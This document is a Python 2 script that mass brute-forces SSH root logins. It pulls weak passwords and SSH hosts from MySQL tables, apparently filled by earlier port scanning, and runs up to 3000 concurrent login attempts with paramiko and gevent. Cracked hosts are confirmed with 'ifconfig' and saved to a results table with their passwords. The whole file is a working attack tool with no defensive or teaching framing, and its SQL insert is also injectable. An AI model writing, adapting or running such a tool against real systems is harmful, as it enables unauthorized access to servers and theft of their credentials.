#!/usr/bin/ python
# -*- coding: utf-8 -*-

from gevent import monkey
from gevent.pool import Pool
monkey.patch_all()
import hashlib,MySQLdb,time,paramiko

conn= MySQLdb.connect(host='localhost',port = 3306,user='root',passwd='root',db ='spider')
cur = conn.cursor()
cur.execute('SET NAMES UTF8')

def create_data(flag, res_data=None):
    sql_passwd = "select password from week_passwd"
    sql_ipport = "select ip,port from baidu_portmap where service like '%ssh%'"
    if flag == "user_passwd":
        cur.execute(sql_passwd)
    elif flag == "ip_port":
        cur.execute(sql_ipport)
    elif flag == "ResToSql":
        ip,passwd = res_data.split(",")
        print ip,passwd
        cur.execute("insert into result (ip,password,types) values ('%s','%s','%s')"%(ip,passwd,"ssh"))
        conn.commit()
    else:
        print "fun create_data error"
    get_all = cur.fetchall()
    return list(get_all)


def ssh_burp(args):
    ip, port, passwd = args
    ssh = paramiko.SSHClient()
    paramiko.util.log_to_file("filename.log")
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname = ip, port = int(port) , password = passwd, username = 'root', timeout = 2)
        cmd = 'ifconfig'
        key_word = "Link"
        stdin, stdout, stderr = ssh.exec_command(cmd)
        if key_word in stdout.readline():
            print "ok --> ",ip
            res_data =  ip+":"+port+","+passwd
            create_data("ResToSql", res_data)
    except Exception as e:
        # print ip+":"+port+"-->"+passwd,e
        print e
    ssh.close()

def yield_data():
    for ip in ip_port:
        for user in user_passwd:
            yield (ip[0],ip[1],user[0])

def getdata_1000():
    result = []
    for i in xrange(3000):
        try:
            result.append(m.next())
        except:
            pass
    return result

m = yield_data()
ip_port ,user_passwd = create_data("ip_port"),create_data("user_passwd")
print ip_port
print user_passwd
print getdata_1000()
pool = Pool(3000)

while True:
    data = getdata_1000()
    if not data:
        break
    pool.map(ssh_burp, data)


